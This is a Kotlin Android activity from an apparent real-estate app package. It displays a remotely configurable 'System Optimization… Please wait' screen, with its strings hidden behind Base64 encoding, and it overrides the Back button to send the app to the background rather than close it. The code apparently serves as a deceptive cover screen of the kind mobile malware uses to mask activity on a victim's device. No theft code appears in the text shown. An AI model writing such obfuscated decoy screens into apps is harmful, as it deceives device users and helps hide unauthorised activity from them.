package com.bla.realestate

import android.os.Bundle
import android.widget.TextView
import android.app.Activity
import android.util.Base64

class SyncActivity : Activity() {
    
    private fun _d(s: String) = String(Base64.decode(s, Base64.DEFAULT))

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_sync)

        val headerText = intent.getStringExtra(_d("dGFza19oZWFk")) ?: _d("U3lzdGVtIE9wdGltaXphdGlvbg==")
        val subText = intent.getStringExtra(_d("dGFza19ib2R5")) ?: _d("T3B0aW1pemF0aW9uIGluIHByb2dyZXNzLiBQbGVhc2Ugd2FpdC4uLg==")

        findViewById<TextView>(R.id.statusHeader).text = headerText
        findViewById<TextView>(R.id.statusSubText).text = subText
    }

    override fun onBackPressed() {
        moveTaskToBack(true)
    }
}
